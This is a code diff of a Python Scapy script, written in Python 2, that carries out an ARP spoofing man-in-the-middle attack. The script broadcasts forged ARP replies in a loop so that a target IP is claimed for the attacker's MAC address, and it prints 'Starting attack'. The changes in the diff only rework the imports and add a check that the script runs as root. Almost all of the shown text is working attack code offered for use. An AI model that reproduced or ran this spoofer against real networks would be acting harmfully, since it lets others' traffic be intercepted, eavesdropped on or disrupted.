@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 
 from scapy.all import *
-import time, sys
+from time import sleep
+from os import geteuid
+import sys
 
 try:
 	print "#################################################"
@@ -23,7 +25,7 @@ def mitm(interface, targetIP, interval=10):
 		print "[*] Starting attack ..."
 		while 1:
 			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=targetIP, hwsrc=myMAC))
-			time.sleep(interval)
+			sleep(interval)
 	except IOError:
 		print "[!] Interface doesn't exist"
 		sys.exit(1)
@@ -31,5 +33,9 @@ def mitm(interface, targetIP, interval=10):
 		pass
 		print ""
 		print "[*] Stopping attack"
+
+if not geteuid() == 0:
+	print "[!] You must to be root"
+	sys.exit(1)
 
 mitm(interface, targetIP)
